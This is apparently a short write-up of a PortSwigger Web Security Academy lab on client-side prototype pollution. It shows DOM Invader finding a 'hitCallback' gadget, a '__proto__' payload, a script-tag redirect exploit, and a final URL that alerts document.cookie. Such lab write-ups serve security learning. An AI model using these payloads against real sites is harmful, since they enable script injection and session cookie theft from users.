---
{"dg-publish":true,"permalink":"/port-swigger-web-academy/prototype-pollution/client-side-prototype-pollution/lab-3/"}
---


---

## Objective: Get document.cookie

### Automatic method

In this lab, we are recommended to use DOM Invader as it saves us time and effort. First just use it like the same open the browser and the extension

![Pasted image 20250330233647.png](/img/user/Images/Pasted%20image%2020250330233647.png)

![Pasted image 20250330233836.png](/img/user/Images/Pasted%20image%2020250330233836.png)

And we get the alert here after exploiting the exploiting the gadget which is `hitCallback`

![Pasted image 20250331001017.png](/img/user/Images/Pasted%20image%2020250331001017.png)

Here is the generated payload that calls an alert

```
/#__proto__[hitCallback]=alert%281%29
```

Now, the objective is to steal the cookie, Portswigger already mad a server for which we can deliver the payload

![Pasted image 20250331001211.png](/img/user/Images/Pasted%20image%2020250331001211.png)

We craft the exploit with `<script>` tags in the body with the `location` reference being our payload 

```
<script>
    location="https://0adc007d04ba9aaa8508314200390060.web-security-academy.net/#__proto__[hitCallback]=alert%281%29"
</script>
```

But the payload is URL-encoded, we can check using Cyberchef

![Pasted image 20250331001409.png](/img/user/Images/Pasted%20image%2020250331001409.png)

### Exploit

Only change the alert to a `document.cookie` and the exploit is set.

```
https://0adc007d04ba9aaa8508314200390060.web-security-academy.net/#__proto__[hitCallback]=alert%28document.cookie%29
```
